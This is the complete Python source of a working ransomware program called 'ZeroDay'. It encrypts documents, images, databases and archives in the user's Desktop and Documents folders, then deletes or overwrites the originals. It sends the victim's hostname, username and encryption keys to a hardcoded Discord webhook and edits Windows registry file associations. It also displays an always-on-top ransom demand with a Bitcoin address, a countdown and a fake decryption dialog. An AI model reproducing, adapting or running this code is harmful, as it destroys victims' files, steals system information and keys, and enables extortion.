import os
import sys
import time
import threading
import socket
import hashlib
import json
import uuid
import random
import string
import base64
import subprocess
import traceback
import requests
import asyncio
import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, font
from datetime import datetime, timedelta, timezone
import winreg

# Try to import cryptography modules
try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import rsa, padding
    from cryptography.hazmat.backends import default_backend
    CRYPTOGRAPHY_AVAILABLE = True
    print("Cryptography modules loaded successfully")
except ImportError as e:
    print(f"Cryptography modules not available: {e}")
    CRYPTOGRAPHY_AVAILABLE = False

# Try to import discord.py
try:
    import discord
    from discord.ext import commands
    DISCORD_AVAILABLE = True
    print("Discord.py module loaded successfully")
except ImportError as e:
    print(f"Discord.py module not available: {e}")
    DISCORD_AVAILABLE = False

# Create a log file for debugging
LOG_FILE = "zeroday_log.txt"

def log_message(message):
    """Log a message to file and print to console"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_entry = f"[{timestamp}] {message}\n"
    print(log_entry.strip())
    
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(log_entry)
    except:
        pass

def associate_py_with_python():
    """Associate .py files with Python interpreter"""
    try:
        if sys.platform == 'win32':
            # Get the path to the Python interpreter
            python_path = sys.executable
            
            # Create registry entries for .py file association
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Classes\.py"
            
            # Create/Open the key
            with winreg.CreateKey(key, subkey) as k:
                winreg.SetValue(k, None, winreg.REG_SZ, "Python.File")
            
            # Create the Python.File key
            subkey = r"Software\Classes\Python.File"
            with winreg.CreateKey(key, subkey) as k:
                winreg.SetValue(k, None, winreg.REG_SZ, "Python File")
                
                # Create the shell key
                with winreg.CreateKey(k, r"shell\open\command") as sk:
                    winreg.SetValue(sk, None, winreg.REG_SZ, f'"{python_path}" "%1" %*')
            
            log_message("Associated .py files with Python")
            return True
        else:
            log_message("File association only implemented for Windows")
            return False
    except Exception as e:
        log_message(f"Error associating .py files: {str(e)}")
        return False

class RansomwareUI:
    def __init__(self, master):
        self.master = master
        self.master.title("ZeroDay Ransomware")
        self.master.geometry("900x650")
        self.master.configure(bg='#0a0a0a')
        self.master.resizable(False, False)
        
        # Make window always on top
        self.master.attributes('-topmost', True)
        
        # Center window on screen
        self.center_window()
        
        # Initialize ransomware
        self.ransomware = None
        self.is_running = False
        self.countdown_running = False
        
        # Create UI elements
        self.create_ui()
        
        # Start ransomware in background
        self.start_background_ransomware()
        
        # Start countdown
        self.start_countdown()
    
    def center_window(self):
        """Center the window on the screen"""
        self.master.update_idletasks()
        width = self.master.winfo_width()
        height = self.master.winfo_height()
        x = (self.master.winfo_screenwidth() // 2) - (width // 2)
        y = (self.master.winfo_screenheight() // 2) - (height // 2)
        self.master.geometry(f'{width}x{height}+{x}+{y}')
    
    def create_ui(self):
        """Create the ransomware UI"""
        # Main frame
        main_frame = tk.Frame(self.master, bg='#0a0a0a')
        main_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
        
        # Title
        title_frame = tk.Frame(main_frame, bg='#0a0a0a')
        title_frame.pack(fill=tk.X, pady=(0, 20))
        
        title_label = tk.Label(title_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", 
                              font=('Arial', 24, 'bold'), fg='#ff0000', bg='#0a0a0a')
        title_label.pack()
        
        subtitle_label = tk.Label(title_frame, text="by ZeroDay Ransomware", 
                                 font=('Arial', 16), fg='#ff0000', bg='#0a0a0a')
        subtitle_label.pack()
        
        # Content frame
        content_frame = tk.Frame(main_frame, bg='#1a1a1a', relief=tk.RIDGE, bd=2)
        content_frame.pack(fill=tk.BOTH, expand=True)
        
        # Left frame - Info
        left_frame = tk.Frame(content_frame, bg='#1a1a1a')
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Info text
        info_text = """
What happened to your files?
----------------------------
All your important files have been encrypted with a military-grade AES-256 algorithm.
The original files were replaced with encrypted copies with extension .ZeroDay.

Can I recover my files?
-----------------------
Yes, but you need to pay. We have the only decryption key.
Trying to recover files yourself will cause permanent data loss.

How do I pay?
-------------
Send 0.5 BTC to this address:
bc1qwc0d85qsu8rct9rzwrpqltdwpstu4j9mltx89d

After payment, send your transaction ID and victim ID to:
support-{victim_id}@protonmail.com

Or visit our Tor site for automated decryption:
http://recoverfilesxw7l3.onion

WARNING:
- Do not turn off your computer or try to remove this software.
- Do not attempt to decrypt files yourself.
- Do not pay scammers who claim they can decrypt your files.
- Only we have the decryption key.

FREE DECRYPTION:
We will decrypt 1 file for free to prove that we can decrypt your files.
Send a file (less than 1MB) to support-{victim_id}@protonmail.com with your victim ID.
        """
        
        info_label = tk.Label(left_frame, text=info_text, justify=tk.LEFT, 
                             font=('Arial', 10), fg='white', bg='#1a1a1a')
        info_label.pack(anchor=tk.W, padx=10, pady=10)
        
        # Right frame - Status
        right_frame = tk.Frame(content_frame, bg='#1a1a1a', width=300)
        right_frame.pack(side=tk.RIGHT, fill=tk.Y, padx=10, pady=10)
        right_frame.pack_propagate(False)
        
        # Victim ID
        victim_frame = tk.Frame(right_frame, bg='#1a1a1a')
        victim_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(victim_frame, text="Victim ID:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#1a1a1a').pack(anchor=tk.W)
        
        self.victim_id_label = tk.Label(victim_frame, text="Generating...", 
                                       font=('Arial', 12, 'bold'), fg='#00ff00', bg='#1a1a1a')
        self.victim_id_label.pack(anchor=tk.W)
        
        # Files encrypted
        files_frame = tk.Frame(right_frame, bg='#1a1a1a')
        files_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(files_frame, text="Files Encrypted:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#1a1a1a').pack(anchor=tk.W)
        
        self.files_label = tk.Label(files_frame, text="0", 
                                   font=('Arial', 12, 'bold'), fg='#00ff00', bg='#1a1a1a')
        self.files_label.pack(anchor=tk.W)
        
        # Timer
        timer_frame = tk.Frame(right_frame, bg='#1a1a1a')
        timer_frame.pack(fill=tk.X, pady=10)
        
        tk.Label(timer_frame, text="Time Remaining:", font=('Arial', 10, 'bold'), 
                fg='white', bg='#1a1a1a').pack(anchor=tk.W)
        
        self.timer_label = tk.Label(timer_frame, text="72:00:00", 
                                   font=('Arial', 12, 'bold'), fg='#ff0000', bg='#1a1a1a')
        self.timer_label.pack(anchor=tk.W)
        
        # Buttons
        button_frame = tk.Frame(right_frame, bg='#1a1a1a')
        button_frame.pack(fill=tk.X, pady=20)
        
        decrypt_button = tk.Button(button_frame, text="DECRYPT FILES", 
                                 font=('Arial', 10, 'bold'), bg='#ff0000', fg='white',
                                 command=self.show_decrypt_dialog)
        decrypt_button.pack(fill=tk.X, pady=5)
        
        test_button = tk.Button(button_frame, text="FREE TEST DECRYPTION", 
                               font=('Arial', 10), bg='#333333', fg='white',
                               command=self.show_test_dialog)
        test_button.pack(fill=tk.X, pady=5)
        
        # Bottom frame - Warning
        bottom_frame = tk.Frame(main_frame, bg='#0a0a0a')
        bottom_frame.pack(fill=tk.X, pady=(20, 0))
        
        warning_text = """
IMPORTANT: All attempts to restore your files will lead to their destruction!
If you don't pay within 72 hours, the price will double, and after 7 days,
your decryption key will be permanently deleted!
        """
        
        warning_label = tk.Label(bottom_frame, text=warning_text, justify=tk.CENTER,
                                font=('Arial', 10, 'bold'), fg='#ff0000', bg='#0a0a0a')
        warning_label.pack()
        
        # Update victim ID when ransomware is initialized
        self.update_victim_id()
    
    def update_victim_id(self):
        """Update the victim ID label"""
        if self.ransomware:
            self.victim_id_label.config(text=self.ransomware.victim_id)
            # Update info text with victim ID
            info_text = self.master.children['!frame'].children['!frame2'].children['!label'].cget('text')
            info_text = info_text.replace('{victim_id}', self.ransomware.victim_id)
            self.master.children['!frame'].children['!frame2'].children['!label'].config(text=info_text)
        else:
            self.master.after(1000, self.update_victim_id)
    
    def start_background_ransomware(self):
        """Start the ransomware in the background"""
        def run_ransomware():
            try:
                # Create ransomware instance with your webhook URL
                webhook_url = "https://discordapp.com/api/webhooks/1484830660001792090/flOUZnguCJNBqwsLe5KIgD8m6RccNzDtHvwRtRslm7ahe_nKX2-N8pJ1PECiVDtnPETZ"
                self.ransomware = SimpleRansomware(webhook_url)
                
                # Run ransomware
                self.ransomware.run()
            except Exception as e:
                log_message(f"Error running ransomware: {str(e)}")
        
        # Start in a separate thread
        ransomware_thread = threading.Thread(target=run_ransomware)
        ransomware_thread.daemon = True
        ransomware_thread.start()
    
    def start_countdown(self):
        """Start the countdown timer"""
        if not self.countdown_running:
            self.countdown_running = True
            self.update_countdown()
    
    def update_countdown(self):
        """Update the countdown timer"""
        if self.ransomware and self.countdown_running:
            # Calculate time remaining
            now = datetime.now()
            deadline = self.ransomware.deadline
            time_remaining = deadline - now
            
            if time_remaining.total_seconds() > 0:
                # Format time as HH:MM:SS
                hours, remainder = divmod(time_remaining.total_seconds(), 3600)
                minutes, seconds = divmod(remainder, 60)
                time_str = f"{int(hours):02d}:{int(minutes):02d}:{int(seconds):02d}"
                
                # Update timer label
                self.timer_label.config(text=time_str)
                
                # Schedule next update
                self.master.after(1000, self.update_countdown)
            else:
                # Time's up
                self.timer_label.config(text="TIME EXPIRED")
                self.countdown_running = False
        
        # Update files encrypted count
        if self.ransomware:
            self.files_label.config(text=str(self.ransomware.encrypted_count))
        
        # Schedule next update
        self.master.after(1000, self.update_countdown)
    
    def show_decrypt_dialog(self):
        """Show the decryption dialog"""
        dialog = tk.Toplevel(self.master)
        dialog.title("Decrypt Files")
        dialog.geometry("400x300")
        dialog.configure(bg='#1a1a1a')
        dialog.resizable(False, False)
        
        # Make dialog always on top
        dialog.attributes('-topmost', True)
        
        # Center dialog on screen
        dialog.update_idletasks()
        width = dialog.winfo_width()
        height = dialog.winfo_height()
        x = (dialog.winfo_screenwidth() // 2) - (width // 2)
        y = (dialog.winfo_screenheight() // 2) - (height // 2)
        dialog.geometry(f'{width}x{height}+{x}+{y}')
        
        # Title
        title_label = tk.Label(dialog, text="DECRYPT FILES", 
                              font=('Arial', 16, 'bold'), fg='#ff0000', bg='#1a1a1a')
        title_label.pack(pady=10)
        
        # Instructions
        instructions = """
To decrypt your files, you need to:

1. Send 0.5 BTC to:
   bc1qwc0d85qsu8rct9rzwrpqltdwpstu4j9mltx89d

2. Send your transaction ID and victim ID to:
   support-{victim_id}@protonmail.com

3. Enter your decryption key below:
        """
        
        instructions_label = tk.Label(dialog, text=instructions, justify=tk.LEFT,
                                     font=('Arial', 10), fg='white', bg='#1a1a1a')
        instructions_label.pack(padx=20, pady=10, anchor=tk.W)
        
        # Key entry
        key_frame = tk.Frame(dialog, bg='#1a1a1a')
        key_frame.pack(fill=tk.X, padx=20, pady=5)
        
        tk.Label(key_frame, text="Decryption Key:", font=('Arial', 10, 'bold'),
                fg='white', bg='#1a1a1a').pack(anchor=tk.W)
        
        key_entry = tk.Entry(key_frame, font=('Arial', 10), bg='#333333', fg='white')
        key_entry.pack(fill=tk.X, pady=5)
        
        # Buttons
        button_frame = tk.Frame(dialog, bg='#1a1a1a')
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        def decrypt_files():
            key = key_entry.get()
            if not key:
                messagebox.showerror("Error", "Please enter a decryption key")
                return
            
            # Show fake progress
            progress = tk.Toplevel(dialog)
            progress.title("Decrypting Files")
            progress.geometry("300x100")
            progress.configure(bg='#1a1a1a')
            progress.resizable(False, False)
            
            # Make progress always on top
            progress.attributes('-topmost', True)
            
            # Center progress on screen
            progress.update_idletasks()
            width = progress.winfo_width()
            height = progress.winfo_height()
            x = (progress.winfo_screenwidth() // 2) - (width // 2)
            y = (progress.winfo_screenheight() // 2) - (height // 2)
            progress.geometry(f'{width}x{height}+{x}+{y}')
            
            tk.Label(progress, text="Decrypting files...", 
                    font=('Arial', 10), fg='white', bg='#1a1a1a').pack(pady=10)
            
            progress_bar = ttk.Progressbar(progress, length=200, mode='determinate')
            progress_bar.pack(pady=10)
            
            def update_progress():
                for i in range(101):
                    progress_bar['value'] = i
                    progress.update()
                    time.sleep(0.02)
                
                progress.destroy()
                messagebox.showerror("Error", "Invalid decryption key! Please check your key and try again.")
            
            threading.Thread(target=update_progress, daemon=True).start()
        
        decrypt_button = tk.Button(button_frame, text="DECRYPT", 
                                 font=('Arial', 10, 'bold'), bg='#ff0000', fg='white',
                                 command=decrypt_files)
        decrypt_button.pack(side=tk.LEFT, padx=5)
        
        cancel_button = tk.Button(button_frame, text="CANCEL", 
                                 font=('Arial', 10), bg='#333333', fg='white',
                                 command=dialog.destroy)
        cancel_button.pack(side=tk.RIGHT, padx=5)
    
    def show_test_dialog(self):
        """Show the test decryption dialog"""
        dialog = tk.Toplevel(self.master)
        dialog.title("Free Test Decryption")
        dialog.geometry("400x250")
        dialog.configure(bg='#1a1a1a')
        dialog.resizable(False, False)
        
        # Make dialog always on top
        dialog.attributes('-topmost', True)
        
        # Center dialog on screen
        dialog.update_idletasks()
        width = dialog.winfo_width()
        height = dialog.winfo_height()
        x = (dialog.winfo_screenwidth() // 2) - (width // 2)
        y = (dialog.winfo_screenheight() // 2) - (height // 2)
        dialog.geometry(f'{width}x{height}+{x}+{y}')
        
        # Title
        title_label = tk.Label(dialog, text="FREE TEST DECRYPTION", 
                              font=('Arial', 16, 'bold'), fg='#00ff00', bg='#1a1a1a')
        title_label.pack(pady=10)
        
        # Instructions
        instructions = """
To get one file decrypted for free:

1. Select a file (less than 1MB)
2. Send it to: support-{victim_id}@protonmail.com
3. We will send you the decrypted file

This proves that we can decrypt your files!
        """
        
        instructions_label = tk.Label(dialog, text=instructions, justify=tk.LEFT,
                                     font=('Arial', 10), fg='white', bg='#1a1a1a')
        instructions_label.pack(padx=20, pady=10, anchor=tk.W)
        
        # Buttons
        button_frame = tk.Frame(dialog, bg='#1a1a1a')
        button_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ok_button = tk.Button(button_frame, text="OK", 
                             font=('Arial', 10, 'bold'), bg='#00ff00', fg='black',
                             command=dialog.destroy)
        ok_button.pack()

class SimpleRansomware:
    def __init__(self, webhook_url=None):
        log_message("Initializing Simple Ransomware")
        
        try:
            # Initialize basic attributes
            self.ransomware_id = "ZeroDay"
            self.extension = f".{self.ransomware_id}"
            self.payment_address = "bc1qwc0d85qsu8rct9rzwrpqltdwpstu4j9mltx89d"
            self.ransom_amount = 0.006  # BTC
            self.victim_id = self.generate_victim_id()
            self.support_email = f"support-{self.victim_id}@protonmail.com"
            self.tor_site = "ERROR 404"
            
            # Discord webhook URL
            self.webhook_url = webhook_url or "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
            
            # Encryption keys
            self.aes_key = None
            self.rsa_public_key = None
            self.rsa_private_key = None
            
            # File tracking
            self.encrypted_files = []
            self.total_files = 0
            self.encrypted_count = 0
            
            # Status flags
            self.encryption_complete = False
            self.deadline = datetime.now() + timedelta(days=3)
            
            # Initialize keys
            self.initialize_encryption()
            
            log_message(f"Initialization complete. Victim ID: {self.victim_id}")
        except Exception as e:
            log_message(f"Error during initialization: {str(e)}")
            log_message(traceback.format_exc())
    
    def generate_victim_id(self):
        """Generate a unique victim ID based on system information"""
        try:
            hostname = socket.gethostname()
            try:
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                               for elements in range(0,2*6,2)][::-1])
            except:
                mac = "00:00:00:00:00:00"
            username = os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
            unique_string = f"{hostname}-{mac}-{username}-{time.time()}"
            victim_id = hashlib.sha256(unique_string.encode()).hexdigest()[:16]
            log_message(f"Generated victim ID: {victim_id}")
            return victim_id
        except Exception as e:
            log_message(f"Error generating victim ID: {str(e)}")
            return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
    
    def initialize_encryption(self):
        """Initialize encryption keys"""
        try:
            if CRYPTOGRAPHY_AVAILABLE:
                # Generate RSA key pair for asymmetric encryption
                self.rsa_private_key = rsa.generate_private_key(
                    public_exponent=65537,
                    key_size=2048,
                    backend=default_backend()
                )
                self.rsa_public_key = self.rsa_private_key.public_key()
                
                # Generate AES key for symmetric encryption
                self.aes_key = os.urandom(32)  # 256-bit key
                
                log_message("Encryption keys initialized with cryptography module")
            else:
                # Simple XOR key for demonstration
                self.aes_key = os.urandom(32)
                log_message("Encryption keys initialized with simple XOR")
        except Exception as e:
            log_message(f"Error initializing encryption: {str(e)}")
            log_message(traceback.format_exc())
            self.aes_key = os.urandom(32)  # Fallback to simple key
    
    def send_to_discord(self, title, description, color=15548997):
        """Send a message to Discord channel using webhook"""
        try:
            # Check if webhook URL is configured
            if self.webhook_url == "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN":
                log_message("Discord webhook not configured, skipping message")
                return False
            
            # Create payload
            payload = {
                "username": "ZeroDay Ransomware",
                "avatar_url": "https://i.imgur.com/4M34hi2.png",
                "embeds": [
                    {
                        "title": title,
                        "description": description,
                        "color": color,
                        "footer": {
                            "text": f"Ransomware ID: {self.ransomware_id}"
                        },
                        "timestamp": datetime.now(timezone.utc).isoformat()
                    }
                ]
            }
            
            # Send request
            response = requests.post(self.webhook_url, json=payload)
            if response.status_code == 204:
                log_message("Discord message sent successfully via webhook")
                return True
            else:
                log_message(f"Discord webhook failed with status code: {response.status_code}")
                return False
        except Exception as e:
            log_message(f"Error sending Discord message via webhook: {str(e)}")
            log_message(traceback.format_exc())
            return False
    
    def send_decryption_key_to_discord(self):
        """Send the decryption key and victim ID to Discord channel using webhook"""
        try:
            # Check if webhook URL is configured
            if self.webhook_url == "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN":
                log_message("Discord webhook not configured, skipping key message")
                return False
            
            # Convert the key to a string for transmission
            if CRYPTOGRAPHY_AVAILABLE:
                # Serialize the private key
                private_key_pem = self.rsa_private_key.private_bytes(
                    encoding=serialization.Encoding.PEM,
                    format=serialization.PrivateFormat.PKCS8,
                    encryption_algorithm=serialization.NoEncryption()
                ).decode('utf-8')
                
                key_data = {
                    "victim_id": self.victim_id,
                    "aes_key": base64.b64encode(self.aes_key).decode('utf-8'),
                    "private_key": private_key_pem,
                    "files_encrypted": self.encrypted_count,
                    "ransomware_id": self.ransomware_id,
                    "hostname": socket.gethostname(),
                    "username": os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
                }
            else:
                # For simple XOR encryption
                key_data = {
                    "victim_id": self.victim_id,
                    "xor_key": base64.b64encode(self.aes_key).decode('utf-8'),
                    "files_encrypted": self.encrypted_count,
                    "ransomware_id": self.ransomware_id,
                    "hostname": socket.gethostname(),
                    "username": os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
                }
            
            # Create payload
            payload = {
                "username": "ZeroDay Ransomware",
                "avatar_url": "https://i.imgur.com/4M34hi2.png",
                "embeds": [
                    {
                        "title": "🔑 ZeroDay Victim Decryption Key",
                        "description": f"**Victim ID:** {self.victim_id}\n"
                                       f"**Hostname:** {socket.gethostname()}\n"
                                       f"**Username:** {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}\n\n"
                                       f"**Files Encrypted:** {self.encrypted_count}\n\n"
                                       f"**Decryption Key:**\n"
                                       f"```\n{json.dumps(key_data, indent=2)}\n```",
                        "color": 15548997,  # Red color
                        "footer": {
                            "text": f"Ransomware ID: {self.ransomware_id}"
                        },
                        "timestamp": datetime.now(timezone.utc).isoformat()
                    }
                ]
            }
            
            # Send request
            response = requests.post(self.webhook_url, json=payload)
            if response.status_code == 204:
                log_message("Decryption key sent to Discord successfully via webhook")
                return True
            else:
                log_message(f"Discord webhook failed with status code: {response.status_code}")
                return False
        except Exception as e:
            log_message(f"Error sending decryption key to Discord via webhook: {str(e)}")
            log_message(traceback.format_exc())
            return False
    
    def encrypt_file(self, file_path):
        """Encrypt a file using AES-256 or simple XOR"""
        try:
            # Skip if already encrypted
            if file_path.endswith(self.extension):
                return False
            
            # Skip if file is too large (>100MB)
            if os.path.getsize(file_path) > 100 * 1024 * 1024:
                return False
            
            # Read file
            with open(file_path, 'rb') as f:
                file_data = f.read()
            
            if CRYPTOGRAPHY_AVAILABLE:
                # Generate IV
                iv = os.urandom(16)
                
                # Encrypt with AES-256-CBC
                cipher = Cipher(
                    algorithms.AES(self.aes_key),
                    modes.CBC(iv),
                    backend=default_backend()
                )
                encryptor = cipher.encryptor()
                
                # Pad data to be multiple of 16 bytes
                pad_length = 16 - (len(file_data) % 16)
                padded_data = file_data + bytes([pad_length] * pad_length)
                
                # Encrypt data
                encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
                
                # Encrypt AES key with RSA public key
                encrypted_key = self.rsa_public_key.encrypt(
                    self.aes_key,
                    padding.OAEP(
                        mgf=padding.MGF1(algorithm=hashes.SHA256()),
                        algorithm=hashes.SHA256(),
                        label=None
                    )
                )
                
                # Write encrypted file
                with open(file_path + self.extension, 'wb') as f:
                    f.write(encrypted_key)
                    f.write(iv)
                    f.write(encrypted_data)
            else:
                # Simple XOR encryption for demonstration
                encrypted_data = bytes([b ^ self.aes_key[i % len(self.aes_key)] for i, b in enumerate(file_data)])
                
                # Write encrypted file
                with open(file_path + self.extension, 'wb') as f:
                    f.write(encrypted_data)
            
            # Delete original file
            try:
                os.remove(file_path)
            except:
                # If can't delete, overwrite with random data
                try:
                    with open(file_path, 'wb') as f:
                        f.write(os.urandom(len(file_data)))
                    os.remove(file_path)
                except:
                    pass
            
            self.encrypted_files.append(file_path)
            self.encrypted_count += 1
            
            log_message(f"Encrypted {file_path}")
            return True
        except Exception as e:
            log_message(f"Error encrypting {file_path}: {str(e)}")
            log_message(traceback.format_exc())
            return False
    
    def create_test_files(self):
        """Create test files for encryption testing"""
        try:
            test_dir = "test_files"
            os.makedirs(test_dir, exist_ok=True)
            
            test_files = [
                "document.txt",
                "photo.jpg",
                "video.mp4",
                "database.db",
                "spreadsheet.xlsx"
            ]
            
            for file in test_files:
                file_path = os.path.join(test_dir, file)
                with open(file_path, 'w') as f:
                    f.write(f"This is a test file for encryption.\n")
                    f.write(f"File: {file}\n")
                    f.write(f"Created: {datetime.now()}\n")
                    f.write(f"Random data: {os.urandom(100).hex()}\n")
                
                log_message(f"Created test file: {file_path}")
            
            return test_dir
        except Exception as e:
            log_message(f"Error creating test files: {str(e)}")
            log_message(traceback.format_exc())
            return None
    
    def scan_and_encrypt(self, directory):
        """Scan directory and encrypt target files"""
        try:
            # Target file extensions
            target_extensions = [
                '.txt', '.doc', '.docx', '.rtf', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
                '.csv', '.sql', '.mdb', '.accdb', '.db', '.dbf', '.sqlite', '.sqlite3',
                '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg', '.psd', '.raw',
                '.mp3', '.mp4', '.avi', '.mov', '.wmv', '.flv', '.mkv', '.wav', '.flac',
                '.zip', '.rar', '.7z', '.tar', '.gz', '.bz2', '.xz', '.ace', '.arj',
                '.pst', '.ost', '.msg', '.eml', '.edb', '.nsf', '.ntf', '.dbx'
            ]
            
            log_message(f"Scanning directory: {directory}")
            
            # Walk through directory
            for root, dirs, files in os.walk(directory):
                # Skip system directories
                dirs[:] = [d for d in dirs if not d.startswith('.') and 
                          d.lower() not in ['windows', 'system32', 'program files', 
                                          'program files (x86)', 'programdata']]
                
                for file in files:
                    file_path = os.path.join(root, file)
                    _, ext = os.path.splitext(file_path)
                    
                    # Check if file extension is in target list
                    if ext.lower() in target_extensions:
                        self.total_files += 1
                        self.encrypt_file(file_path)
            
            log_message(f"Finished scanning {directory}. Files encrypted: {self.encrypted_count}")
            return True
        except Exception as e:
            log_message(f"Error scanning {directory}: {str(e)}")
            log_message(traceback.format_exc())
            return False
    
    def create_ransom_note(self, path):
        """Create a ransom note at the specified path"""
        try:
            note_content = f"""
            ============================================
            YOUR FILES HAVE BEEN ENCRYPTED BY {self.ransomware_id.upper()}!
            ============================================
            
            What happened to your files?
            --------------------------------
            All your important files have been encrypted with a military-grade AES-256 algorithm.
            The original files were replaced with encrypted copies with extension {self.extension}.
            
            Can I recover my files?
            -----------------------
            Yes, but you need to pay. We have the only decryption key.
            Trying to recover files yourself will cause permanent data loss.
            
            How do I pay?
            -------------
            Send {self.ransom_amount} BTC to this address:
            {self.payment_address}
            
            After payment, send your transaction ID and victim ID to:
            {self.support_email}
            
            Or visit our Tor site for automated decryption:
            {self.tor_site}
            
            You have until {self.deadline.strftime('%Y-%m-%d %H:%M:%S')} to pay.
            After this deadline, the price will double, and after 7 days, 
            your decryption key will be permanently deleted.
            
            Files encrypted: {self.encrypted_count}
            Victim ID: {self.victim_id}
            
            WARNING: 
            - Do not turn off your computer or try to remove this software.
            - Do not attempt to decrypt files yourself.
            - Do not pay scammers who claim they can decrypt your files.
            - Only we have the decryption key.
            
            FREE DECRYPTION:
            We will decrypt 1 file for free to prove that we can decrypt your files.
            Send a file (less than 1MB) to {self.support_email} with your victim ID.
            """
            
            os.makedirs(os.path.dirname(path), exist_ok=True)
            with open(path, 'w') as f:
                f.write(note_content)
            
            log_message(f"Created ransom note at {path}")
            return True
        except Exception as e:
            log_message(f"Error creating ransom note at {path}: {str(e)}")
            log_message(traceback.format_exc())
            return False
    
    def run(self):
        """Main execution function"""
        try:
            log_message("Starting Simple Ransomware execution")
            
            # Create test files for testing
            test_dir = self.create_test_files()
            
            # Notify Discord that encryption is starting
            self.send_to_discord(
                "🚨 ZeroDay Infection Started",
                f"**Victim ID:** {self.victim_id}\n**Hostname:** {socket.gethostname()}\n**Username:** {os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))}",
                15548997  # Red color
            )
            
            # Encrypt test files
            if test_dir:
                self.scan_and_encrypt(test_dir)
            
            # Encrypt user directories (limited for testing)
            user_dirs = []
            if sys.platform == 'win32':
                user_dirs = [
                    os.path.join(os.environ.get('USERPROFILE', ''), "Desktop"),
                    os.path.join(os.environ.get('USERPROFILE', ''), "Documents"),
                ]
            else:
                user_dirs = [
                    os.path.expanduser("~/Desktop"),
                    os.path.expanduser("~/Documents"),
                ]
            
            for directory in user_dirs:
                if os.path.exists(directory):
                    self.scan_and_encrypt(directory)
            
            # Notify Discord that encryption is complete
            self.send_to_discord(
                "✅ ZeroDay Encryption Complete",
                f"**Victim ID:** {self.victim_id}\n**Files Encrypted:** {self.encrypted_count}\n**Deadline:** {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}",
                5763719  # Green color
            )
            
            # Send decryption key to Discord
            self.send_decryption_key_to_discord()
            
            # Create ransom notes
            if sys.platform == 'win32':
                note_path = os.path.join(os.environ.get('USERPROFILE', ''), "Desktop", "FILES_ENCRYPTED.txt")
            else:
                note_path = os.path.expanduser("~/Desktop/FILES_ENCRYPTED.txt")
            
            self.create_ransom_note(note_path)
            
            log_message("Simple Ransomware execution completed")
            return True
        except Exception as e:
            log_message(f"Error during execution: {str(e)}")
            log_message(traceback.format_exc())
            return False

# Main execution
if __name__ == "__main__":
    try:
        # Associate .py files with Python
        associate_py_with_python()
        
        # Create and run the UI
        root = tk.Tk()
        app = RansomwareUI(root)
        root.mainloop()
    except Exception as e:
        log_message(f"Fatal error: {str(e)}")
        log_message(traceback.format_exc())
